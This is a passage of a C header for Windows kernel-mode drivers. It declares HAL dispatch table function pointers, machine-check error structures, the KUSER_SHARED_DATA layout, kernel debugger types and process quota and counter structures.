
typedef struct _PM_DISPATCH_TABLE {
  ULONG Signature;
  ULONG Version;
  PVOID Function[1];
} PM_DISPATCH_TABLE, *PPM_DISPATCH_TABLE;

typedef NTSTATUS
(NTAPI *pHalInitPowerManagement)(
  IN PPM_DISPATCH_TABLE PmDriverDispatchTable,
  OUT PPM_DISPATCH_TABLE *PmHalDispatchTable);

typedef struct _DMA_ADAPTER*
(NTAPI *pHalGetDmaAdapter)(
  IN PVOID Context,
  IN struct _DEVICE_DESCRIPTION *DeviceDescriptor,
  OUT PULONG NumberOfMapRegisters);

typedef NTSTATUS
(NTAPI *pHalGetInterruptTranslator)(
  IN INTERFACE_TYPE ParentInterfaceType,
  IN ULONG ParentBusNumber,
  IN INTERFACE_TYPE BridgeInterfaceType,
  IN USHORT Size,
  IN USHORT Version,
  OUT PTRANSLATOR_INTERFACE Translator,
  OUT PULONG BridgeBusNumber);

typedef NTSTATUS
(NTAPI *pHalStartMirroring)(
  VOID);

typedef NTSTATUS
(NTAPI *pHalEndMirroring)(
  IN ULONG PassNumber);

typedef NTSTATUS
(NTAPI *pHalMirrorPhysicalMemory)(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN LARGE_INTEGER NumberOfBytes);

typedef NTSTATUS
(NTAPI *pHalMirrorVerify)(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN LARGE_INTEGER NumberOfBytes);

typedef BOOLEAN
(NTAPI *pHalTranslateBusAddress)(
  IN INTERFACE_TYPE InterfaceType,
  IN ULONG BusNumber,
  IN PHYSICAL_ADDRESS BusAddress,
  IN OUT PULONG AddressSpace,
  OUT PPHYSICAL_ADDRESS TranslatedAddress);

typedef NTSTATUS
(NTAPI *pHalAssignSlotResources)(
  IN PUNICODE_STRING RegistryPath,
  IN PUNICODE_STRING DriverClassName OPTIONAL,
  IN PDRIVER_OBJECT DriverObject,
  IN PDEVICE_OBJECT DeviceObject,
  IN INTERFACE_TYPE BusType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN OUT PCM_RESOURCE_LIST *AllocatedResources);

typedef VOID
(NTAPI *pHalHaltSystem)(
  VOID);

typedef BOOLEAN
(NTAPI *pHalResetDisplay)(
  VOID);

typedef struct _MAP_REGISTER_ENTRY {
  PVOID MapRegister;
  BOOLEAN WriteToDevice;
} MAP_REGISTER_ENTRY, *PMAP_REGISTER_ENTRY;

typedef UCHAR
(NTAPI *pHalVectorToIDTEntry)(
  ULONG Vector);

typedef BOOLEAN
(NTAPI *pHalFindBusAddressTranslation)(
  IN PHYSICAL_ADDRESS BusAddress,
  IN OUT PULONG AddressSpace,
  OUT PPHYSICAL_ADDRESS TranslatedAddress,
  IN OUT PULONG_PTR Context,
  IN BOOLEAN NextBus);

typedef VOID
(NTAPI *pHalEndOfBoot)(
  VOID);

typedef PVOID
(NTAPI *pHalGetAcpiTable)(
  IN ULONG Signature,
  IN PCSTR OemId OPTIONAL,
  IN PCSTR OemTableId OPTIONAL);

#if defined(_IA64_)
typedef NTSTATUS
(*pHalGetErrorCapList)(
  IN OUT PULONG CapsListLength,
  IN OUT PUCHAR ErrorCapList);

typedef NTSTATUS
(*pHalInjectError)(
  IN ULONG BufferLength,
  IN PUCHAR Buffer);
#endif

typedef VOID
(NTAPI *PCI_ERROR_HANDLER_CALLBACK)(
  VOID);

typedef VOID
(NTAPI *pHalSetPciErrorHandlerCallback)(
  IN PCI_ERROR_HANDLER_CALLBACK Callback);

#if 1 /* Not present in WDK 7600 */
typedef VOID
(FASTCALL *pHalIoAssignDriveLetters)(
  IN struct _LOADER_PARAMETER_BLOCK *LoaderBlock,
  IN PSTRING NtDeviceName,
  OUT PUCHAR NtSystemPath,
  OUT PSTRING NtSystemPathString);
#endif

typedef struct {
  ULONG Version;
  pHalQuerySystemInformation HalQuerySystemInformation;
  pHalSetSystemInformation HalSetSystemInformation;
  pHalQueryBusSlots HalQueryBusSlots;
  ULONG Spare1;
  pHalExamineMBR HalExamineMBR;
#if 1 /* Not present in WDK 7600 */
  pHalIoAssignDriveLetters HalIoAssignDriveLetters;
#endif
  pHalIoReadPartitionTable HalIoReadPartitionTable;
  pHalIoSetPartitionInformation HalIoSetPartitionInformation;
  pHalIoWritePartitionTable HalIoWritePartitionTable;
  pHalHandlerForBus HalReferenceHandlerForBus;
  pHalReferenceBusHandler HalReferenceBusHandler;
  pHalReferenceBusHandler HalDereferenceBusHandler;
  pHalInitPnpDriver HalInitPnpDriver;
  pHalInitPowerManagement HalInitPowerManagement;
  pHalGetDmaAdapter HalGetDmaAdapter;
  pHalGetInterruptTranslator HalGetInterruptTranslator;
  pHalStartMirroring HalStartMirroring;
  pHalEndMirroring HalEndMirroring;
  pHalMirrorPhysicalMemory HalMirrorPhysicalMemory;
  pHalEndOfBoot HalEndOfBoot;
  pHalMirrorVerify HalMirrorVerify;
  pHalGetAcpiTable HalGetCachedAcpiTable;
  pHalSetPciErrorHandlerCallback  HalSetPciErrorHandlerCallback;
#if defined(_IA64_)
  pHalGetErrorCapList HalGetErrorCapList;
  pHalInjectError HalInjectError;
#endif
} HAL_DISPATCH, *PHAL_DISPATCH;

/* GCC/MSVC and WDK compatible declaration */
extern NTKERNELAPI HAL_DISPATCH HalDispatchTable;

#if defined(_NTOSKRNL_) || defined(_BLDR_)
#define HALDISPATCH (&HalDispatchTable)
#else
/* This is a WDK compatibility definition */
#define HalDispatchTable (&HalDispatchTable)
#define HALDISPATCH HalDispatchTable
#endif

#define HAL_DISPATCH_VERSION            3 /* FIXME: when to use 4? */
#define HalDispatchTableVersion         HALDISPATCH->Version
#define HalQuerySystemInformation       HALDISPATCH->HalQuerySystemInformation
#define HalSetSystemInformation         HALDISPATCH->HalSetSystemInformation
#define HalQueryBusSlots                HALDISPATCH->HalQueryBusSlots
#define HalReferenceHandlerForBus       HALDISPATCH->HalReferenceHandlerForBus
#define HalReferenceBusHandler          HALDISPATCH->HalReferenceBusHandler
#define HalDereferenceBusHandler        HALDISPATCH->HalDereferenceBusHandler
#define HalInitPnpDriver                HALDISPATCH->HalInitPnpDriver
#define HalInitPowerManagement          HALDISPATCH->HalInitPowerManagement
#define HalGetDmaAdapter                HALDISPATCH->HalGetDmaAdapter
#define HalGetInterruptTranslator       HALDISPATCH->HalGetInterruptTranslator
#define HalStartMirroring               HALDISPATCH->HalStartMirroring
#define HalEndMirroring                 HALDISPATCH->HalEndMirroring
#define HalMirrorPhysicalMemory         HALDISPATCH->HalMirrorPhysicalMemory
#define HalEndOfBoot                    HALDISPATCH->HalEndOfBoot
#define HalMirrorVerify                 HALDISPATCH->HalMirrorVerify
#define HalGetCachedAcpiTable           HALDISPATCH->HalGetCachedAcpiTable
#define HalSetPciErrorHandlerCallback   HALDISPATCH->HalSetPciErrorHandlerCallback
#if defined(_IA64_)
#define HalGetErrorCapList              HALDISPATCH->HalGetErrorCapList
#define HalInjectError                  HALDISPATCH->HalInjectError
#endif

typedef struct _HAL_BUS_INFORMATION {
  INTERFACE_TYPE BusType;
  BUS_DATA_TYPE ConfigurationType;
  ULONG BusNumber;
  ULONG Reserved;
} HAL_BUS_INFORMATION, *PHAL_BUS_INFORMATION;

typedef struct _HAL_PROFILE_SOURCE_INFORMATION {
  KPROFILE_SOURCE Source;
  BOOLEAN Supported;
  ULONG Interval;
} HAL_PROFILE_SOURCE_INFORMATION, *PHAL_PROFILE_SOURCE_INFORMATION;

typedef struct _HAL_PROFILE_SOURCE_INFORMATION_EX {
  KPROFILE_SOURCE Source;
  BOOLEAN Supported;
  ULONG_PTR Interval;
  ULONG_PTR DefInterval;
  ULONG_PTR MaxInterval;
  ULONG_PTR MinInterval;
} HAL_PROFILE_SOURCE_INFORMATION_EX, *PHAL_PROFILE_SOURCE_INFORMATION_EX;

typedef struct _HAL_PROFILE_SOURCE_INTERVAL {
  KPROFILE_SOURCE Source;
  ULONG_PTR Interval;
} HAL_PROFILE_SOURCE_INTERVAL, *PHAL_PROFILE_SOURCE_INTERVAL;

typedef struct _HAL_PROFILE_SOURCE_LIST {
  KPROFILE_SOURCE Source;
  PWSTR Description;
} HAL_PROFILE_SOURCE_LIST, *PHAL_PROFILE_SOURCE_LIST;

typedef enum _HAL_DISPLAY_BIOS_INFORMATION {
  HalDisplayInt10Bios,
  HalDisplayEmulatedBios,
  HalDisplayNoBios
} HAL_DISPLAY_BIOS_INFORMATION, *PHAL_DISPLAY_BIOS_INFORMATION;

typedef struct _HAL_POWER_INFORMATION {
  ULONG TBD;
} HAL_POWER_INFORMATION, *PHAL_POWER_INFORMATION;

typedef struct _HAL_PROCESSOR_SPEED_INFO {
  ULONG ProcessorSpeed;
} HAL_PROCESSOR_SPEED_INFORMATION, *PHAL_PROCESSOR_SPEED_INFORMATION;

typedef struct _HAL_CALLBACKS {
  PCALLBACK_OBJECT SetSystemInformation;
  PCALLBACK_OBJECT BusCheck;
} HAL_CALLBACKS, *PHAL_CALLBACKS;

typedef struct _HAL_PROCESSOR_FEATURE {
  ULONG UsableFeatureBits;
} HAL_PROCESSOR_FEATURE;

typedef NTSTATUS
(NTAPI *PHALIOREADWRITEHANDLER)(
  IN BOOLEAN fRead,
  IN ULONG dwAddr,
  IN ULONG dwSize,
  IN OUT PULONG pdwData);

typedef struct _HAL_AMLI_BAD_IO_ADDRESS_LIST {
  ULONG BadAddrBegin;
  ULONG BadAddrSize;
  ULONG OSVersionTrigger;
  PHALIOREADWRITEHANDLER IOHandler;
} HAL_AMLI_BAD_IO_ADDRESS_LIST, *PHAL_AMLI_BAD_IO_ADDRESS_LIST;

#if defined(_X86_) || defined(_IA64_) || defined(_AMD64_)

typedef VOID
(NTAPI *PHALMCAINTERFACELOCK)(
  VOID);

typedef VOID
(NTAPI *PHALMCAINTERFACEUNLOCK)(
  VOID);

typedef NTSTATUS
(NTAPI *PHALMCAINTERFACEREADREGISTER)(
  IN UCHAR BankNumber,
  IN OUT PVOID Exception);

typedef struct _HAL_MCA_INTERFACE {
  PHALMCAINTERFACELOCK Lock;
  PHALMCAINTERFACEUNLOCK Unlock;
  PHALMCAINTERFACEREADREGISTER ReadRegister;
} HAL_MCA_INTERFACE;

typedef enum {
  ApicDestinationModePhysical = 1,
  ApicDestinationModeLogicalFlat,
  ApicDestinationModeLogicalClustered,
  ApicDestinationModeUnknown
} HAL_APIC_DESTINATION_MODE, *PHAL_APIC_DESTINATION_MODE;

#if defined(_AMD64_)

struct _KTRAP_FRAME;
struct _KEXCEPTION_FRAME;

typedef ERROR_SEVERITY
(NTAPI *PDRIVER_EXCPTN_CALLBACK)(
  IN PVOID Context,
  IN struct _KTRAP_FRAME *TrapFrame,
  IN struct _KEXCEPTION_FRAME *ExceptionFrame,
  IN PMCA_EXCEPTION Exception);

#endif

#if defined(_X86_) || defined(_IA64_)
typedef
#if defined(_IA64_)
ERROR_SEVERITY
#else
VOID
#endif
(NTAPI *PDRIVER_EXCPTN_CALLBACK)(
  IN PVOID Context,
  IN PMCA_EXCEPTION BankLog);
#endif

typedef PDRIVER_EXCPTN_CALLBACK PDRIVER_MCA_EXCEPTION_CALLBACK;

typedef struct _MCA_DRIVER_INFO {
  PDRIVER_MCA_EXCEPTION_CALLBACK ExceptionCallback;
  PKDEFERRED_ROUTINE DpcCallback;
  PVOID DeviceContext;
} MCA_DRIVER_INFO, *PMCA_DRIVER_INFO;

typedef struct _HAL_ERROR_INFO {
  ULONG Version;
  ULONG InitMaxSize;
  ULONG McaMaxSize;
  ULONG McaPreviousEventsCount;
  ULONG McaCorrectedEventsCount;
  ULONG McaKernelDeliveryFails;
  ULONG McaDriverDpcQueueFails;
  ULONG McaReserved;
  ULONG CmcMaxSize;
  ULONG CmcPollingInterval;
  ULONG CmcInterruptsCount;
  ULONG CmcKernelDeliveryFails;
  ULONG CmcDriverDpcQueueFails;
  ULONG CmcGetStateFails;
  ULONG CmcClearStateFails;
  ULONG CmcReserved;
  ULONGLONG CmcLogId;
  ULONG CpeMaxSize;
  ULONG CpePollingInterval;
  ULONG CpeInterruptsCount;
  ULONG CpeKernelDeliveryFails;
  ULONG CpeDriverDpcQueueFails;
  ULONG CpeGetStateFails;
  ULONG CpeClearStateFails;
  ULONG CpeInterruptSources;
  ULONGLONG CpeLogId;
  ULONGLONG KernelReserved[4];
} HAL_ERROR_INFO, *PHAL_ERROR_INFO;

#define HAL_MCE_INTERRUPTS_BASED ((ULONG)-1)
#define HAL_MCE_DISABLED          ((ULONG)0)

#define HAL_CMC_INTERRUPTS_BASED  HAL_MCE_INTERRUPTS_BASED
#define HAL_CMC_DISABLED          HAL_MCE_DISABLED

#define HAL_CPE_INTERRUPTS_BASED  HAL_MCE_INTERRUPTS_BASED
#define HAL_CPE_DISABLED          HAL_MCE_DISABLED

#define HAL_MCA_INTERRUPTS_BASED  HAL_MCE_INTERRUPTS_BASED
#define HAL_MCA_DISABLED          HAL_MCE_DISABLED

typedef VOID
(NTAPI *PDRIVER_CMC_EXCEPTION_CALLBACK)(
  IN PVOID Context,
  IN PCMC_EXCEPTION CmcLog);

typedef VOID
(NTAPI *PDRIVER_CPE_EXCEPTION_CALLBACK)(
  IN PVOID Context,
  IN PCPE_EXCEPTION CmcLog);

typedef struct _CMC_DRIVER_INFO {
  PDRIVER_CMC_EXCEPTION_CALLBACK ExceptionCallback;
  PKDEFERRED_ROUTINE DpcCallback;
  PVOID DeviceContext;
} CMC_DRIVER_INFO, *PCMC_DRIVER_INFO;

typedef struct _CPE_DRIVER_INFO {
  PDRIVER_CPE_EXCEPTION_CALLBACK ExceptionCallback;
  PKDEFERRED_ROUTINE DpcCallback;
  PVOID DeviceContext;
} CPE_DRIVER_INFO, *PCPE_DRIVER_INFO;

#endif // defined(_X86_) || defined(_IA64_) || defined(_AMD64_)

#if defined(_IA64_)

typedef NTSTATUS
(*HALSENDCROSSPARTITIONIPI)(
  IN USHORT ProcessorID,
  IN UCHAR HardwareVector);

typedef NTSTATUS
(*HALRESERVECROSSPARTITIONINTERRUPTVECTOR)(
  OUT PULONG Vector,
  OUT PKIRQL Irql,
  IN OUT PGROUP_AFFINITY Affinity,
  OUT PUCHAR HardwareVector);

typedef VOID
(*HALFREECROSSPARTITIONINTERRUPTVECTOR)(
  IN ULONG Vector,
  IN PGROUP_AFFINITY Affinity);

typedef struct _HAL_CROSS_PARTITION_IPI_INTERFACE {
  HALSENDCROSSPARTITIONIPI HalSendCrossPartitionIpi;
  HALRESERVECROSSPARTITIONINTERRUPTVECTOR HalReserveCrossPartitionInterruptVector;
  HALFREECROSSPARTITIONINTERRUPTVECTOR HalFreeCrossPartitionInterruptVector;
} HAL_CROSS_PARTITION_IPI_INTERFACE;

#define HAL_CROSS_PARTITION_IPI_INTERFACE_MINIMUM_SIZE \
    FIELD_OFFSET(HAL_CROSS_PARTITION_IPI_INTERFACE,    \
                 HalFreeCrossPartitionInterruptVector)

#endif /* defined(_IA64_) */

typedef struct _HAL_PLATFORM_INFORMATION {
  ULONG PlatformFlags;
} HAL_PLATFORM_INFORMATION, *PHAL_PLATFORM_INFORMATION;

#define HAL_PLATFORM_DISABLE_WRITE_COMBINING      0x01L
#define HAL_PLATFORM_DISABLE_PTCG                 0x04L
#define HAL_PLATFORM_DISABLE_UC_MAIN_MEMORY       0x08L
#define HAL_PLATFORM_ENABLE_WRITE_COMBINING_MMIO  0x10L
#define HAL_PLATFORM_ACPI_TABLES_CACHED           0x20L

/******************************************************************************
 *                              Kernel Types                                  *
 ******************************************************************************/

#define NX_SUPPORT_POLICY_ALWAYSOFF 0
#define NX_SUPPORT_POLICY_ALWAYSON 1
#define NX_SUPPORT_POLICY_OPTIN 2
#define NX_SUPPORT_POLICY_OPTOUT 3

typedef VOID
(NTAPI *PEXPAND_STACK_CALLOUT)(
  IN PVOID Parameter OPTIONAL);

typedef VOID
(NTAPI *PTIMER_APC_ROUTINE)(
  IN PVOID TimerContext,
  IN ULONG TimerLowValue,
  IN LONG TimerHighValue);

typedef enum _TIMER_SET_INFORMATION_CLASS {
  TimerSetCoalescableTimer,
  MaxTimerInfoClass 
} TIMER_SET_INFORMATION_CLASS;

#if (NTDDI_VERSION >= NTDDI_WIN7)
typedef struct _TIMER_SET_COALESCABLE_TIMER_INFO {
  IN LARGE_INTEGER DueTime;
  IN PTIMER_APC_ROUTINE TimerApcRoutine OPTIONAL;
  IN PVOID TimerContext OPTIONAL;
  IN struct _COUNTED_REASON_CONTEXT *WakeContext OPTIONAL;
  IN ULONG Period OPTIONAL;
  IN ULONG TolerableDelay;
  OUT PBOOLEAN PreviousState OPTIONAL;
} TIMER_SET_COALESCABLE_TIMER_INFO, *PTIMER_SET_COALESCABLE_TIMER_INFO;
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#define XSTATE_LEGACY_FLOATING_POINT        0
#define XSTATE_LEGACY_SSE                   1
#define XSTATE_GSSE                         2

#define XSTATE_MASK_LEGACY_FLOATING_POINT   (1i64 << (XSTATE_LEGACY_FLOATING_POINT))
#define XSTATE_MASK_LEGACY_SSE              (1i64 << (XSTATE_LEGACY_SSE))
#define XSTATE_MASK_LEGACY                  (XSTATE_MASK_LEGACY_FLOATING_POINT | XSTATE_MASK_LEGACY_SSE)
#define XSTATE_MASK_GSSE                    (1i64 << (XSTATE_GSSE))

#define MAXIMUM_XSTATE_FEATURES             64

typedef struct _XSTATE_FEATURE {
  ULONG Offset;
  ULONG Size;
} XSTATE_FEATURE, *PXSTATE_FEATURE;

typedef struct _XSTATE_CONFIGURATION {
  ULONG64 EnabledFeatures;
  ULONG Size;
  ULONG OptimizedSave:1;
  XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];
} XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;

#define MAX_WOW64_SHARED_ENTRIES 16

typedef struct _KUSER_SHARED_DATA {
  ULONG TickCountLowDeprecated;
  ULONG TickCountMultiplier;
  volatile KSYSTEM_TIME InterruptTime;
  volatile KSYSTEM_TIME SystemTime;
  volatile KSYSTEM_TIME TimeZoneBias;
  USHORT ImageNumberLow;
  USHORT ImageNumberHigh;
  WCHAR NtSystemRoot[260];
  ULONG MaxStackTraceDepth;
  ULONG CryptoExponent;
  ULONG TimeZoneId;
  ULONG LargePageMinimum;
  ULONG Reserved2[7];
  NT_PRODUCT_TYPE NtProductType;
  BOOLEAN ProductTypeIsValid;
  ULONG NtMajorVersion;
  ULONG NtMinorVersion;
  BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];
  ULONG Reserved1;
  ULONG Reserved3;
  volatile ULONG TimeSlip;
  ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
  ULONG AltArchitecturePad[1];
  LARGE_INTEGER SystemExpirationDate;
  ULONG SuiteMask;
  BOOLEAN KdDebuggerEnabled;
#if (NTDDI_VERSION >= NTDDI_WINXPSP2)
  UCHAR NXSupportPolicy;
#endif
  volatile ULONG ActiveConsoleId;
  volatile ULONG DismountCount;
  ULONG ComPlusPackage;
  ULONG LastSystemRITEventTickCount;
  ULONG NumberOfPhysicalPages;
  BOOLEAN SafeBootMode;
#if (NTDDI_VERSION >= NTDDI_WIN7)
  _ANONYMOUS_UNION union {
    UCHAR TscQpcData;
    _ANONYMOUS_STRUCT struct {
      UCHAR TscQpcEnabled:1;
      UCHAR TscQpcSpareFlag:1;
      UCHAR TscQpcShift:6;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  UCHAR TscQpcPad[2];
#endif
#if (NTDDI_VERSION >= NTDDI_VISTA)
  _ANONYMOUS_UNION union {
    ULONG SharedDataFlags;
    _ANONYMOUS_STRUCT struct {
      ULONG DbgErrorPortPresent:1;
      ULONG DbgElevationEnabled:1;
      ULONG DbgVirtEnabled:1;
      ULONG DbgInstallerDetectEnabled:1;
      ULONG DbgSystemDllRelocated:1;
      ULONG DbgDynProcessorEnabled:1;
      ULONG DbgSEHValidationEnabled:1;
      ULONG SpareBits:25;
    } DUMMYSTRUCTNAME2;
  } DUMMYUNIONNAME2;
#else
  ULONG TraceLogging;
#endif
  ULONG DataFlagsPad[1];
  ULONGLONG TestRetInstruction;
  ULONG SystemCall;
  ULONG SystemCallReturn;
  ULONGLONG SystemCallPad[3];
  _ANONYMOUS_UNION union {
    volatile KSYSTEM_TIME TickCount;
    volatile ULONG64 TickCountQuad;
    _ANONYMOUS_STRUCT struct {
      ULONG ReservedTickCountOverlay[3];
      ULONG TickCountPad[1];
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME3;
  ULONG Cookie;
  ULONG CookiePad[1];
#if (NTDDI_VERSION >= NTDDI_WS03)
  LONGLONG ConsoleSessionForegroundProcessId;
  ULONG Wow64SharedInformation[MAX_WOW64_SHARED_ENTRIES];
#endif
#if (NTDDI_VERSION >= NTDDI_VISTA)
#if (NTDDI_VERSION >= NTDDI_WIN7)
  USHORT UserModeGlobalLogger[16];
#else
  USHORT UserModeGlobalLogger[8];
  ULONG HeapTracingPid[2];
  ULONG CritSecTracingPid[2];
#endif
  ULONG ImageFileExecutionOptions;
#if (NTDDI_VERSION >= NTDDI_VISTASP1)
  ULONG LangGenerationCount;
#else
  /* 4 bytes padding */
#endif
  ULONGLONG Reserved5;
  volatile ULONG64 InterruptTimeBias;
#endif
#if (NTDDI_VERSION >= NTDDI_WIN7)
  volatile ULONG64 TscQpcBias;
  volatile ULONG ActiveProcessorCount;
  volatile USHORT ActiveGroupCount;
  USHORT Reserved4;
  volatile ULONG AitSamplingValue;
  volatile ULONG AppCompatFlag;
  ULONGLONG SystemDllNativeRelocation;
  ULONG SystemDllWowRelocation;
  ULONG XStatePad[1];
  XSTATE_CONFIGURATION XState;
#endif
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

#if (NTDDI_VERSION >= NTDDI_VISTA)
extern NTSYSAPI volatile CCHAR KeNumberProcessors;
#elif (NTDDI_VERSION >= NTDDI_WINXP)
extern NTSYSAPI CCHAR KeNumberProcessors;
#else
extern PCCHAR KeNumberProcessors;
#endif


/******************************************************************************
 *                          Kernel Debugger Types                             *
 ******************************************************************************/
typedef struct _DEBUG_DEVICE_ADDRESS {
  UCHAR Type;
  BOOLEAN Valid;
  UCHAR Reserved[2];
  PUCHAR TranslatedAddress;
  ULONG Length;
} DEBUG_DEVICE_ADDRESS, *PDEBUG_DEVICE_ADDRESS;

typedef struct _DEBUG_MEMORY_REQUIREMENTS {
  PHYSICAL_ADDRESS Start;
  PHYSICAL_ADDRESS MaxEnd;
  PVOID VirtualAddress;
  ULONG Length;
  BOOLEAN Cached;
  BOOLEAN Aligned;
} DEBUG_MEMORY_REQUIREMENTS, *PDEBUG_MEMORY_REQUIREMENTS;

typedef struct _DEBUG_DEVICE_DESCRIPTOR {
  ULONG Bus;
  ULONG Slot;
  USHORT Segment;
  USHORT VendorID;
  USHORT DeviceID;
  UCHAR BaseClass;
  UCHAR SubClass;
  UCHAR ProgIf;
  BOOLEAN Initialized;
  BOOLEAN Configured;
  DEBUG_DEVICE_ADDRESS BaseAddress[6];
  DEBUG_MEMORY_REQUIREMENTS Memory;
} DEBUG_DEVICE_DESCRIPTOR, *PDEBUG_DEVICE_DESCRIPTOR;

typedef NTSTATUS
(NTAPI *pKdSetupPciDeviceForDebugging)(
  IN PVOID LoaderBlock OPTIONAL,
  IN OUT PDEBUG_DEVICE_DESCRIPTOR PciDevice);

typedef NTSTATUS
(NTAPI *pKdReleasePciDeviceForDebugging)(
  IN OUT PDEBUG_DEVICE_DESCRIPTOR PciDevice);

typedef PVOID
(NTAPI *pKdGetAcpiTablePhase0)(
  IN struct _LOADER_PARAMETER_BLOCK *LoaderBlock,
  IN ULONG Signature);

typedef VOID
(NTAPI *pKdCheckPowerButton)(
  VOID);

#if (NTDDI_VERSION >= NTDDI_VISTA)
typedef PVOID
(NTAPI *pKdMapPhysicalMemory64)(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN ULONG NumberPages,
  IN BOOLEAN FlushCurrentTLB);

typedef VOID
(NTAPI *pKdUnmapVirtualAddress)(
  IN PVOID VirtualAddress,
  IN ULONG NumberPages,
  IN BOOLEAN FlushCurrentTLB);
#else
typedef PVOID
(NTAPI *pKdMapPhysicalMemory64)(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN ULONG NumberPages);

typedef VOID
(NTAPI *pKdUnmapVirtualAddress)(
  IN PVOID VirtualAddress,
  IN ULONG NumberPages);
#endif

typedef ULONG
(NTAPI *pKdGetPciDataByOffset)(
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  OUT PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

typedef ULONG
(NTAPI *pKdSetPciDataByOffset)(
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);
/******************************************************************************
 *                         Memory manager Types                               *
 ******************************************************************************/

typedef struct _PHYSICAL_MEMORY_RANGE {
  PHYSICAL_ADDRESS BaseAddress;
  LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef NTSTATUS
(NTAPI *PMM_ROTATE_COPY_CALLBACK_FUNCTION)(
  IN PMDL DestinationMdl,
  IN PMDL SourceMdl,
  IN PVOID Context);

typedef enum _MM_ROTATE_DIRECTION {
  MmToFrameBuffer,
  MmToFrameBufferNoCopy,
  MmToRegularMemory,
  MmToRegularMemoryNoCopy,
  MmMaximumRotateDirection
} MM_ROTATE_DIRECTION, *PMM_ROTATE_DIRECTION;


/******************************************************************************
 *                           Process Manager Types                            *
 ******************************************************************************/

#define QUOTA_LIMITS_HARDWS_MIN_ENABLE  0x00000001
#define QUOTA_LIMITS_HARDWS_MIN_DISABLE 0x00000002
#define QUOTA_LIMITS_HARDWS_MAX_ENABLE  0x00000004
#define QUOTA_LIMITS_HARDWS_MAX_DISABLE 0x00000008
#define QUOTA_LIMITS_USE_DEFAULT_LIMITS 0x00000010

typedef struct _QUOTA_LIMITS {
  SIZE_T PagedPoolLimit;
  SIZE_T NonPagedPoolLimit;
  SIZE_T MinimumWorkingSetSize;
  SIZE_T MaximumWorkingSetSize;
  SIZE_T PagefileLimit;
  LARGE_INTEGER TimeLimit;
} QUOTA_LIMITS, *PQUOTA_LIMITS;

typedef union _RATE_QUOTA_LIMIT {
  ULONG RateData;
  _ANONYMOUS_STRUCT struct {
    ULONG RatePercent:7;
    ULONG Reserved0:25;
  } DUMMYSTRUCTNAME;
} RATE_QUOTA_LIMIT, *PRATE_QUOTA_LIMIT;

typedef struct _QUOTA_LIMITS_EX {
  SIZE_T PagedPoolLimit;
  SIZE_T NonPagedPoolLimit;
  SIZE_T MinimumWorkingSetSize;
  SIZE_T MaximumWorkingSetSize;
  SIZE_T PagefileLimit;
  LARGE_INTEGER TimeLimit;
  SIZE_T WorkingSetLimit;
  SIZE_T Reserved2;
  SIZE_T Reserved3;
  SIZE_T Reserved4;
  ULONG Flags;
  RATE_QUOTA_LIMIT CpuRateLimit;
} QUOTA_LIMITS_EX, *PQUOTA_LIMITS_EX;

typedef struct _IO_COUNTERS {
  ULONGLONG ReadOperationCount;
  ULONGLONG WriteOperationCount;
  ULONGLONG OtherOperationCount;
  ULONGLONG ReadTransferCount;
  ULONGLONG WriteTransferCount;
  ULONGLONG OtherTransferCount;
} IO_COUNTERS, *PIO_COUNTERS;

typedef struct _VM_COUNTERS {
  SIZE_T PeakVirtualSize;
  SIZE_T VirtualSize;
  ULONG PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
} VM_COUNTERS, *PVM_COUNTERS;

typedef struct _VM_COUNTERS_EX {
  SIZE_T PeakVirtualSize;
  SIZE_T VirtualSize;
  ULONG PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
  SIZE_T PrivateUsage;
} VM_COUNTERS_EX, *PVM_COUNTERS_EX;

#define MAX_HW_COUNTERS 16
#define THREAD_PROFILING_FLAG_DISPATCH  0x00000001

typedef enum _HARDWARE_COUNTER_TYPE {
  PMCCounter,
  MaxHardwareCounterType
} HARDWARE_COUNTER_TYPE, *PHARDWARE_COUNTER_TYPE;

typedef struct _HARDWARE_COUNTER {
  HARDWARE_COUNTER_TYPE Type;
  ULONG Reserved;
  ULONG64 Index;
} HARDWARE_COUNTER, *PHARDWARE_COUNTER;

typedef struct _POOLED_USAGE_AND_LIMITS {
  SIZE_T PeakPagedPoolUsage;
  SIZE_T PagedPoolUsage;
  SIZE_T PagedPoolLimit;
  SIZE_T PeakNonPagedPoolUsage;
  SIZE_T NonPagedPoolUsage;
  SIZE_T NonPagedPoolLimit;
  SIZE_T PeakPagefileUsage;
  SIZE_T PagefileUsage;
  SIZE_T PagefileLimit;
} POOLED_USAGE_AND_LIMITS, *PPOOLED_USAGE_AND_LIMITS;

typedef struct _PROCESS_ACCESS_TOKEN {
  HANDLE Token;
  HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

#define PROCESS_EXCEPTION_PORT_ALL_STATE_BITS     0x00000003UL
